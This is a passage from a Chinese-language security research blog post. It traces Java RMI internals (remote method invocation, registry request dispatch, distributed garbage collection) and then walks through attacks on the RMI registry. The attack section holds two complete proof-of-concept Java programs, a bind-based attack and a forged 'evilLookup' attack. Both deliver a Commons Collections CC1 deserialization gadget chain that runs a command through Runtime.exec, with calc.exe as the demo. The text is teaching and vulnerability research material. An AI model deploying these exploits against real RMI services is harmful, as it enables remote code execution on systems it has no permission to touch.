alt="image-20250710150914832"></p><p>其中in是通过getInputStream获得的，是数据流里的东西</p><p>然后通过反序列化动态获取注册远程对象时创建的代理类：</p><p><img src="/archives/9738c3bd/image-20250710155026707.png" alt="image-20250710155026707"></p><p><img src="/archives/9738c3bd/image-20250710155919688.png" alt="image-20250710155919688"></p><h5 id="调用远程对象方法"><a href="#调用远程对象方法" class="headerlink" title="调用远程对象方法"></a>调用远程对象方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(o.Hello());</span><br></pre></td></tr></table></figure><p><img src="/archives/9738c3bd/image-20250710160253844.png" alt="image-20250710160253844"></p><p>获取了远程对象的Stub代理类后，当执行方法时就会触发RemoteObjectInvocationHandler.invoke方法：</p><p><img src="/archives/9738c3bd/image-20250710160648810.png" alt="image-20250710160648810"></p><p>在创建远程对象时我们已经分析过了，这里的hello方法自然不是一个Object方法，会调用invokeRemoteMethod方法作为返回值：</p><p><img src="/archives/9738c3bd/image-20250710160830404.png" alt="image-20250710160830404"></p><p>接着调用UnicastRef.invoke方法，这和前面lookup和rebind中的invoke不一样不要混淆了：</p><p><img src="/archives/9738c3bd/image-20250710162101894.png" alt="image-20250710162101894"></p><p><img src="/archives/9738c3bd/image-20250710162212529.png" alt="image-20250710162212529"></p><p>它先创建一个连接通道，然后建立连接</p><p><img src="/archives/9738c3bd/image-20250710162326212.png" alt="image-20250710162326212"></p><p>这里将call序列化到输出流中</p><p><img src="/archives/9738c3bd/image-20250710162720361.png" alt="image-20250710162720361"></p><p>调用streamRemoteCall.executeCall()方法触发调用进行网络通信</p><p><img src="/archives/9738c3bd/image-20250710163015184-17521362165531.png" alt="image-20250710163015184"></p><p><img src="/archives/9738c3bd/image-20250710163033363.png" alt="image-20250710163033363"></p><p>然后进行反序列化，返回反序列化结果</p><h4 id="注册中心处理请求"><a href="#注册中心处理请求" class="headerlink" title="注册中心处理请求"></a>注册中心处理请求</h4><p>在注册端，是由sun.rmi.transport.tcp.TCPTransport#handleMessages方法来处理请求的</p><p>当服务传入rmi调用时，如客户端或服务端与 RMI 注册中心交互或者客户端调用远程方法时，就是进入第一个swith&#x2F;case语句：</p><p><img src="/archives/9738c3bd/image-20250710172243047.png" alt="image-20250710172243047"></p><p><img src="/archives/9738c3bd/image-20250710171941533.png" alt="image-20250710171941533"></p><p>调用了serviceCall方法，call就是通过某个连接对象获取相应的remoteCall对象</p><p>TCPTransport继承了Transport类，由于子类没有这个方法，会去调用父类的serviceCall方法：</p><p><img src="/archives/9738c3bd/image-20250710172920185.png" alt="image-20250710172920185"></p><p>大体逻辑是从ObjectTable中获取封装的Target对象：</p><p><img src="/archives/9738c3bd/image-20250710173216448.png" alt="image-20250710173216448"></p><p>获取其中的RegistryImpl对象</p><p><img src="/archives/9738c3bd/image-20250710173245341.png" alt="image-20250710173245341"></p><p>获取disp，就是前面创建注册中心和创建远程对象时看到的UnicastServerRef对象：</p><p><img src="/archives/9738c3bd/image-20250710173703920.png" alt="image-20250710173703920"></p><p>然后调用了对象的dispatch方法：</p><p><img src="/archives/9738c3bd/image-20250710173834287.png" alt="image-20250710173834287"></p><p>跟进UnicastServerRef.dispatch方法：</p><p><img src="/archives/9738c3bd/image-20250710181436426.png" alt="image-20250710181436426"></p><p>调用oldDispatch方法：</p><p><img src="/archives/9738c3bd/image-20250710181551892.png" alt="image-20250710181551892"></p><p>接着调用skel.dispatch方法，即Registrylmpl_Skel.dispatch方法：</p><p><img src="/archives/9738c3bd/image-20250710182257818.png" alt="image-20250710182257818"></p><p>当var3为0时是处理bind的请求，将remoteCall字节流进行反序列化以获取这个远程对象和RMI服务名称，并通过Registry.bind绑定RMI服务</p><p>而当var3处理lookup的请求对应另一个case语句：<br><img src="/archives/9738c3bd/image-20250710182921855.png" alt="image-20250710182921855"></p><p>逻辑是类似的，其他情况分别对应其他操作注册表的方法，如rebind，unbind，list等等。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>总结一下RMI请求序列化和反序类化的过程：</p><ul><li>remoteCall序列化RMI服务名称和远程对象</li><li>Registry_Skel.dispatch方法处（注册中心）反序列化remoteCall字节流</li><li>反射调用RMI服务实现类的对应方法并序列化执行结果</li><li>将方法执行结果的序列化流反序列化，返回给客户端</li></ul><h2 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h2><p>前面在分析源码时提到了DGC，其实这个挺重要的，这里简要说一下</p><p>DGC(Distributed Garbage Collection)，<strong>分布式垃圾回收</strong>。</p><p>在Java虚拟机中，一个远程对象不仅会被本地虚拟机内的变量引用，也能被远程引用，而只有当一个远程对象不受到任何本地引用和远程引用或者如果引用的“租期”过期并没有更新时，这个远程对象才会结束生命周期，此时服务器会将垃圾回收远程对象。</p><p>服务端的一个远程对象一般在3个地方被引用：</p><ul><li>服务端的一个本地对象持有它的<strong>本地引用</strong></li><li>服务端的远程对象已经注册到<strong>RMI Registry注册表</strong>中，即RMI Registry注册表有它的远程引用</li><li>客户端获得远程对象的<strong>存根对象</strong>，即客户端持有它的远程引用</li></ul><p>而服务端判断客户端是否持有远程对象引用的方法：</p><ul><li>当客户端获得一个服务端的远程对象的存根时，就会向服务器发送一条租约(lease)通知，以告诉服务器自己持有了这个对象的引用了。</li><li>客户端定期的向服务器发送租约通知，以保证服务器始终都知道客户端一直持有远程对象的引用。</li><li>租约是有期限的，如果期约到期了，服务器则认为客户端已经不再持有远程对象的引用了。</li></ul><p>在前面创建RMI注册中心和远程对象时，在调试时发现了新的对象：</p><p><img src="/archives/9738c3bd/image-20250711170700601.png" alt="image-20250711170700601"></p><p>发现在执行<code>ObjectTable.putTarget(target);</code>将target对象存入ObjectTable时，出现了DGCImpl_Stub和DGCImpl_Skel对象。跟进<code>ObjectTable.putTarget(target);</code>方法：</p><p><img src="/archives/9738c3bd/image-20250711171324312.png" alt="image-20250711171324312"></p><p>这里调用DGCImpl的静态变量，会对DGCImpl进行初始化，主要作用是利用DGC跟踪远程对象的引用并记录日志，而在DGCImpl类中存在静态代码块，跟进一下怎么实现的：</p><p><img src="/archives/9738c3bd/image-20250711172443702.png" alt="image-20250711172443702"></p><p>这里就说得通了，这里新建了一个DGCImpl对象，并用它来新建了DGCImpl_Skel对象和DGCImpl_Stub代理类，并创建了一个新的target对象存入ObjectTable中。</p><p>同时Java提供了java.rmi.dgc.DGC接口，这个接口继承了Remote接口，并且定义了两个重要的方法dirty和clean方法：</p><p><img src="/archives/9738c3bd/image-20250711173509809.png" alt="image-20250711173509809"></p><p>涉及的类：</p><ul><li>Lease：一个lease包含了一个唯一的VM标识符和一个租借期限</li><li>VMID是跨所有Java虚拟机的唯一标识符</li></ul><p>其命名规则和处理逻辑都类似于Registry对象</p><p>而在客户端查找远程对象时<code>RMIInterface o=(RMIInterface) Naming.lookup(RMI_NAME);</code>，在Registry_Stub.lookup中：<br><img src="/archives/9738c3bd/image-20250713195939848.png" alt="image-20250713195939848"></p><p>在接受了服务端的返回值后，通过done的后续调用创建DGCImpl_Stub，并调用了其中的DGCImpl_Stub.dirty。在DGCImpl_Stub.dirty方法中，调用完invoke后，进行反序列化操作：<br><img src="/archives/9738c3bd/image-20250713200342847.png" alt="image-20250713200342847"></p><p>而注册中心在处理请求部分对应于DGCImpl_Skel.dispatch方法，当DGC调用完DGCImpl_Stub.dirty方法</p><p>DGCImpl_Skel.dispatch会处理这个方法的请求，对应的switch&#x2F;case语句：</p><p><img src="/archives/9738c3bd/image-20250713200620861.png" alt="image-20250713200620861"></p><p>这里同样存在反序列化，还原Lease对象</p><h2 id="RMI攻击"><a href="#RMI攻击" class="headerlink" title="RMI攻击"></a>RMI攻击</h2><h3 id="攻击注册中心"><a href="#攻击注册中心" class="headerlink" title="攻击注册中心"></a>攻击注册中心</h3><h4 id="基本方法及原理"><a href="#基本方法及原理" class="headerlink" title="基本方法及原理"></a>基本方法及原理</h4><p>我们与注册中心进行交互可以使用如下几种方式</p><ul><li><strong>0 —- bind  -缺少readObject方法，所以没法达到序列化效果，就无法利用</strong></li><li><strong>1 —- list</strong></li><li><strong>2 —- lookup</strong></li><li><strong>3 —- rebind</strong></li><li><strong>4 —- unbind</strong></li></ul><p>这几种方法位于RegistryImpl_Skel#dispatch中，如果存在readObject，则可以利用</p><p>服务端和客户端攻击注册中心的方式是相同的，都是远程获取注册中心后传递一个恶意对象进行利用。</p><p>其对应的反序列化触发点在RegistryImpl_Skel.dispatch方法，当客户端调用Naming.lookup方法或者服务端调用Naming.bind等需要操作注册表的方法，注册中心为了处理这些方法的请求都会调用RegistryImpl_Skel.dispatch方法</p><h4 id="服务端攻击注册中心"><a href="#服务端攻击注册中心" class="headerlink" title="服务端攻击注册中心"></a>服务端攻击注册中心</h4><h5 id="bind-rebind攻击"><a href="#bind-rebind攻击" class="headerlink" title="bind&#x2F;rebind攻击"></a>bind&#x2F;rebind攻击</h5><p>通过从服务端注册某个恶意远程对象，在注册中心反序列化RemoteCall字节流，从而导致攻击，这个反序列化对象就是远程注册时创建的动态代理类。</p><p>其中bind和rebind方法的逻辑是差不多的，bind参数需要是一个Remote类型的对象，而AnnotationInvocationHandler是InvocationHandler的子类，所以我们可以利用AnnotationInvocationHandler来代理Remote接口，通过反射来获取AnnotationInvocation实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class invocation=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor constructor=invocation.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">InvocationHandler handler=(InvocationHandler)constructor.newInstance(Retention.class,lazymap);</span><br></pre></td></tr></table></figure><p>而看到AnnotationInvocationHandler自然就会想到CC1链，这里直接利用CC1，只是与CC1不同的是RMI是通过执行bind方法将恶意远程对象proxy与注册中心绑定，而在传输时会序列化，当注册中心处理请求时执行RegistryImpl.dispatch时就会进行反序列化绕过调用我们的链子。</p><p>完整poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">server</span> &#123;</span><br><span class="line">    <span class="comment">//rmi服务地址</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String HOST=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> PORT=<span class="number">1099</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String RMI_PATH=<span class="string">&quot;/b1uel0n3&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String RMI_NAME=<span class="string">&quot;rmi://&quot;</span>+HOST+<span class="string">&quot;:&quot;</span>+PORT+RMI_PATH;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.createRegistry(PORT);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chaind=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazymap= LazyMap.decorate(hashMap,chaind);</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class invocation=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=invocation.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler handler=(InvocationHandler)constructor.newInstance(Retention.class,lazymap);</span><br><span class="line">        Map proxy=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class, proxy);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">r</span> <span class="operator">=</span> (Remote)Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, invocationHandler);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(PORT);</span><br><span class="line">        registry.bind(RMI_NAME,r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/9738c3bd/image-20250713225636154.png" alt="image-20250713225636154"></p><p>需要注意的是，在处理请求时，注册端会验证服务端地址是否被注册端允许的（默认是只信任本机地址）：</p><p><img src="/archives/9738c3bd/image-20250713221944308.png" alt="image-20250713221944308"></p><h5 id="unbind攻击"><a href="#unbind攻击" class="headerlink" title="unbind攻击"></a>unbind攻击</h5><p>其实unbind和lookup攻击手法是一样的，看后面客户端lookup的分析</p><p>由于checkAccess限制，在jdk8u121之后，会变成先验证再反序列化，即会验证是否为本地地址，此时服务端攻击注册端就不可用了，只能在本地调用bind、unbind、rebind方法。</p><h4 id="客户端攻击注册中心"><a href="#客户端攻击注册中心" class="headerlink" title="客户端攻击注册中心"></a>客户端攻击注册中心</h4><h5 id="lookup攻击"><a href="#lookup攻击" class="headerlink" title="lookup攻击"></a>lookup攻击</h5><p>由于jdk8u121之后Java远程访问注册中心做了限制，只有来源地址为本地才能调用bind、rebind、unbind方法。但客户端能执行lookup方法</p><p>lookup和unbind攻击手法是一样的，先看注册中心处理请求的源码：</p><p><img src="/archives/9738c3bd/image-20250713231216958.png" alt="image-20250713231216958"></p><p><img src="/archives/9738c3bd/image-20250713231234021.png" alt="image-20250713231234021"></p><p>实际上这两者的攻击思路和<code>bind/rebind</code>是相类似的，但是<code>lookup</code>这里只能传入<code>String</code>字符串，我们可以通过伪造<code>lookup</code>连接请求利用，修改<code>lookup</code>方法，使其可以传入对象</p><p>而对象输入跟paramRemotecall相关，所以看能不能控制传输过去的paramRemotecall：</p><p><img src="/archives/9738c3bd/image-20250713231830120.png" alt="image-20250713231830120"></p><p>通过RegistryImpl_Stub.lookup可以看到，是通过super.ref.invoke()方法来传输到注册中心的</p><p>这里我们需要重写lookup，而RemoteCall var2的重写需要this,oprerations，其他的已知，按照传输过程进行编写</p><p>先获取RegistryImpl_Stub对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.getRegistry(HOST, PORT);</span><br></pre></td></tr></table></figure><p>然后获取ref:</p><p><img src="/archives/9738c3bd/image-20250713232356903.png" alt="image-20250713232356903"></p><p>是一个UnicastRef对象，这是我们被代理的类</p><p>这个变量的定义位于Registry_Stub对象父类的父类中，利用反射这样获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(HOST,PORT);</span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> registry.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">System.out.println(f.get(registry));</span><br></pre></td></tr></table></figure><p>还需要获取operations，一样通过反射得到:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(HOST,PORT);</span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> registry.getClass().getDeclaredField(<span class="string">&quot;operations&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">System.out.println(f.get(registry));</span><br></pre></td></tr></table></figure><p>接着我们编写一个恶意的evilLookup方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">evilLookup</span><span class="params">(Registry r, Object evilObject)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Field f1=r.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">    f1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    RemoteRef ref=(RemoteRef) f1.get(r);</span><br><span class="line"></span><br><span class="line">    Field f2=r.getClass().getDeclaredField(<span class="string">&quot;operations&quot;</span>);</span><br><span class="line">    f2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    Operation[] operations=(Operation[]) f2.get(r);</span><br><span class="line"></span><br><span class="line">    RemoteCall remoteCall=ref.newCall((RemoteObject) r, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> remoteCall.getOutputStream();</span><br><span class="line">    var3.writeObject(evilObject);</span><br><span class="line">    ref.invoke(remoteCall);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面恶意代理类流程不变，完整poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteRef;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> rmi.server.PORT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chaind=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazymap= LazyMap.decorate(hashMap,chaind);</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class invocation=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=invocation.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler handler=(InvocationHandler)constructor.newInstance(Retention.class,lazymap);</span><br><span class="line">        Map proxy=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class, proxy);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">r</span> <span class="operator">=</span> (Remote)Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, invocationHandler);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(PORT);</span><br><span class="line"></span><br><span class="line">        evilLookup(registry,r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">evilLookup</span><span class="params">(Registry r, Object evilObject)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field f1=r.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        f1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        RemoteRef ref=(RemoteRef) f1.get(r);</span><br><span class="line"></span><br><span class="line">        Field f2=r.getClass().getDeclaredField(<span class="string">&quot;operations&quot;</span>);</span><br><span class="line">        f2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations=(Operation[]) f2.get(r);</span><br><span class="line"></span><br><span class="line">        RemoteCall remoteCall=ref.newCall((RemoteObject) r, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> remoteCall.getOutputStream();</span><br><span class="line">        var3.writeObject(evilObject);</span><br><span class="line">        ref.invoke(remoteCall);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/9738c3bd/image-20250713235837976.png" 